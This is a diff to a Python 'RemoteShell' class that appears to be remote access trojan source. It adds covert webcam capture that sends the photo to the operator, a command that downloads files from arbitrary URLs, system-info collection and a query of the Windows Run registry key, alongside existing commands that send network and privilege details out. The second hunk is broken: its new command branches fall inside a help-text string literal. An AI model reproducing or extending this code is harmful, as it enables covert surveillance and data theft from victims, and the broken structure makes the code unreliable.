@@ -292,18 +292,25 @@ class RemoteShell:
                         elif command.strip().lower() == 'network':
                             network_info = subprocess.getoutput('ipconfig /all')
                             connection.send(network_info.encode())
-                        elif command.strip().lower() == 'registry':
-                            registry_info = subprocess.getoutput('reg query HKCU /f')
-                            connection.send(registry_info.encode())
+
                         elif command.strip().lower() == 'privilege':
                             privilege_info = subprocess.getoutput('whoami /priv')
                             connection.send(privilege_info.encode())
                         elif command.strip().lower() == 'webcam':
-                            cap = cv2.VideoCapture(0)
-                            ret, frame = cap.read()
-                            cv2.imwrite('webcam_capture.jpg', frame)
-                            cap.release()
-                            connection.send("Webcam photo captured successfully\n".encode())
+                            try:
+                                cap = cv2.VideoCapture(0)
+                                ret, frame = cap.read()
+                                cv2.imwrite('webcam_capture.jpg', frame)
+                                cap.release()
+                                with open('webcam_capture.jpg', 'rb') as file:
+                                    data = file.read()
+                                connection.sendall(b'BEGIN_WEBCAM_IMAGE')
+                                connection.sendall(data)
+                                connection.sendall(b'END_WEBCAM_IMAGE')
+                                connection.send("Webcam photo captured and sent successfully\n".encode())
+                            except Exception as e:
+                                connection.send(f"Failed to capture webcam: {e}\n".encode())
+
                         elif command.strip().lower() == 'remote':
                             screenshot_data = self.remote_desktop()
                             connection.sendall(b'BEGIN_REMOTE_DESKTOP')
@@ -402,6 +409,22 @@ class RemoteShell:
                             connection.send("Windows Explorer opened successfully\n".encode())
                         elif command.strip().lower() == 'help':
                             help_text = """
+                        elif command.strip().lower() == 'system_info':
+                            connection.send(self.get_system_info().encode())
+                        elif command.strip().lower().startswith('download '):
+                            url = command.split(' ', 1)[1].strip()
+                            filename = os.path.basename(url)
+                            response = self.download_file(url, filename)
+                            connection.send(response.encode())
+                        elif command.strip().lower() == 'registry':
+                            try:
+                                registry_info = subprocess.getoutput('reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run')
+                                connection.send(registry_info.encode())
+                            except Exception as e:
+                                connection.send(f"Failed to get registry info: {e}\n".encode())
+
+
+
 Available commands:
 1. cwd - Display current directory
 2. cd [directory] - Change directory
